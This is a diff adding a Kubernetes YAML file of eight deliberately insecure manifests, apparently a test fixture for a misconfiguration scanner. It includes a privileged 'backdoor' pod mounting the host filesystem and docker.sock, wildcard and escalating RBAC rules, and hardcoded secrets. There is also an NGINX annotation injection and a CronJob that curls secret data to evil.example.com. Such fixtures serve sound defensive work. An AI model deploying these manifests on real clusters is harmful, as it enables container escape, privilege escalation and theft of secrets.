@@ -1,0 +1,208 @@
+---
+# Doc 1: Privileged Deployment with many misconfigurations
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: backdoor-app
+  namespace: default
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: backdoor-app
+  template:
+    metadata:
+      # no labels on pod template
+    spec:
+      hostNetwork: true
+      hostPID: true
+      hostIPC: true
+      shareProcessNamespace: true
+      serviceAccountName: default
+      automountServiceAccountToken: true
+      hostAliases:
+        - ip: "1.2.3.4"
+          hostnames:
+            - "internal-api.corp"
+      containers:
+        - name: backdoor
+          image: nginx:latest
+          imagePullPolicy: IfNotPresent
+          tty: true
+          stdin: true
+          command: ["/bin/sh", "-c", "export AWS_SECRET_ACCESS_KEY=abc123; sleep 9999"]
+          securityContext:
+            privileged: true
+            allowPrivilegeEscalation: true
+            runAsUser: 0
+            capabilities:
+              add:
+                - SYS_ADMIN
+                - NET_ADMIN
+                - SYS_PTRACE
+                - SETUID
+                - SETGID
+                - NET_RAW
+            readOnlyRootFilesystem: false
+          env:
+            - name: DB_PASSWORD
+              value: "supersecret123"
+            - name: API_TOKEN
+              value: "tok-abc987xyz"
+          ports:
+            - containerPort: 8080
+              hostPort: 8080
+          resources: {}
+          volumeMounts:
+            - mountPath: /var/run/docker.sock
+              name: docker-sock
+            - mountPath: /host-root
+              name: host-root
+            - mountPath: /host-proc
+              name: host-proc
+      volumes:
+        - name: docker-sock
+          hostPath:
+            path: /var/run/docker.sock
+        - name: host-root
+          hostPath:
+            path: /
+        - name: host-proc
+          hostPath:
+            path: /proc
+        - name: scratch
+          emptyDir: {}
+
+---
+# Doc 2: Overly permissive ClusterRole
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: superuser-role
+rules:
+  - apiGroups: ["*"]
+    resources: ["*"]
+    verbs: ["*"]
+  - apiGroups: [""]
+    resources: ["pods/exec", "pods/portforward", "nodes/proxy"]
+    verbs: ["create"]
+  - apiGroups: [""]
+    resources: ["secrets"]
+    verbs: ["get", "list", "watch"]
+  - apiGroups: ["rbac.authorization.k8s.io"]
+    resources: ["roles", "clusterroles"]
+    verbs: ["bind", "escalate"]
+  - apiGroups: [""]
+    resources: ["serviceaccounts"]
+    verbs: ["impersonate"]
+  - apiGroups: [""]
+    resources: ["pods"]
+    verbs: ["create", "delete", "deletecollection"]
+
+---
+# Doc 3: ClusterRoleBinding to cluster-admin
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: give-everyone-admin
+subjects:
+  - kind: User
+    name: developer
+    apiGroup: rbac.authorization.k8s.io
+roleRef:
+  kind: ClusterRole
+  apiGroup: rbac.authorization.k8s.io
+  name: cluster-admin
+
+---
+# Doc 4: ConfigMap with hardcoded secrets
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: app-config
+  namespace: default
+data:
+  APP_ENV: "production"
+  DB_PASSWORD: "plaintextpassword123"
+  API_SECRET: "my-super-secret-key"
+  TOKEN: "eyJhbGciOiJSUzI1NiJ9.fake.token"
+
+---
+# Doc 5: Ingress without TLS + NGINX annotation injection
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  name: insecure-ingress
+  namespace: default
+  annotations:
+    nginx.ingress.kubernetes.io/configuration-snippet: |
+      add_header X-Injected "evil";
+      proxy_pass_header Authorization;
+spec:
+  rules:
+    - host: app.example.com
+      http:
+        paths:
+          - path: /
+            pathType: Prefix
+            backend:
+              service:
+                name: backdoor-svc
+                port:
+                  number: 80
+
+---
+# Doc 6: Service with NodePort exposure
+apiVersion: v1
+kind: Service
+metadata:
+  name: exposed-nodeport
+  namespace: default
+spec:
+  type: NodePort
+  selector:
+    app: backdoor-app
+  ports:
+    - port: 80
+      targetPort: 8080
+      nodePort: 31337
+
+---
+# Doc 7: CronJob with no limits, no history, concurrency Allow
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: data-exfil-job
+  namespace: default
+spec:
+  schedule: "*/5 * * * *"
+  concurrencyPolicy: Allow
+  jobTemplate:
+    spec:
+      template:
+        spec:
+          containers:
+            - name: exfil
+              image: curlimages/curl
+              command: ["curl", "-X", "POST", "https://evil.example.com/data", "--data", "secret=abc123"]
+              resources: {}
+          restartPolicy: OnFailure
+
+---
+# Doc 8: Deprecated API version
+apiVersion: extensions/v1beta1
+kind: Deployment
+metadata:
+  name: legacy-deploy
+  namespace: default
+spec:
+  replicas: 1
+  template:
+    metadata:
+      labels:
+        app: legacy
+    spec:
+      containers:
+        - name: legacy-app
+          image: myregistry/legacy:latest
+          resources: {}
